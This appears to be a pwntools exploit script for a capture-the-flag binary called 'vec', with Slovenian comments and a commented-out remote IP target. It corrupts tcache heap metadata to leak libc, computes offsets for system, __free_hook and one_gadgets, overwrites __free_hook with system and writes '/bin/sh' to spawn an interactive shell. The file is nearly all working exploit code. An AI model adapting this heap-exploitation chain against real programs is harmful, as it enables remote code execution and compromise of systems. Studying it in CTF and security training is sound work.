from pwn import *
from time import sleep
#sleep(1)
#context.terminal = ['tmux',"new-window"]

p = process("./vec")
#raw_input()
#sleep(1)
#p = remote('143.198.184.186', 5004)
#pid = gdb.attach(p,gdbscript='b * answer+550')



p.sendline(str(20))

def do_sodo(q,n,overwrite,what):

    p.sendline(str(n))
    p.sendline(str(q))

    for j in range(n):
        p.sendline(str(what))
    if q > 0:
        p.sendline(b'1') # t
        p.sendline(b'0') # x
        p.sendline(str(overwrite)) # y



def do_liho(q,n,what):
    p.sendline(str(n))
    p.sendline(str(q))

    for _ in range(n):
        p.sendline(str(what))
    if q > 0:
        p.sendline(b'0') #t
        p.sendline(b'2') #x

do_sodo(0,258,0x0,0x0) # main_area_addr na heap -> 2 chunka v tcache
do_sodo(1,1,0x131,0x0) # sprazni tcache part1
do_sodo(1,1,0x131+0x110+0x20,0x0) # sprazni tcache part2 overwrite size (potegni iz 0x21, daj v 0x401)
do_liho(1,1,0x0) #dobi leak i hope 
do_sodo(0,240,0x0,0x0)
do_sodo(1,2,0x91,0x0)


leak = int(p.recvline())
print("leak_libc: ",hex(leak))
libc_base = leak -0x789ca0 #0x33abe0
print("libc_base: ", hex(libc_base))
system = libc_base +0x3ed550# 0x1a4410
_free_hook = libc_base +0x78b8e8 #0x33db28
_malloc_hook = libc_base +0x789c30
one_gadget1 = libc_base +0x4f3d5+0x39e000 
one_gadget2 = libc_base +0x10a41c+0x39e000 
one_gadget3 = libc_base +0x4f432+0x39e000
print(hex(one_gadget1))


rebuild_heap = [0x0,0x0,0x0,0x21,_free_hook,0x0,0x0,0x411,0x0]

rebuild_heap += [0x3c1] * (0xe - len(rebuild_heap))

p.sendline(str(0xe))
p.sendline(str(1))
#print(rebuild_heap)
for _ in rebuild_heap:
    p.sendline(str(_))

p.sendline(b'1') # t
p.sendline(b'0') # x
p.sendline(str(0x21)) # y

do_sodo(1,1,0x41,0x0)
do_sodo(1,1,0x41,0x0)
do_sodo(1,1,0x41,0x0)
#do_sodo(1,0x70,0x200,0x0068732f6e69622f)
do_sodo(0,1,0x41,system)
do_sodo(0,1,0x0,0x0068732f6e69622f) #/bin./sh\0

#p.sendline('cat flag.txt')
#do_sodo(0,1,0x0,0x4242424242424242)
#do_sodo(0,1,0x0,0x4343434343434343)
#do_sodo(0,1,0x0,system)
#do_sodo(0,1,0x0,0x0068732f6e69622f)
p.interactive()


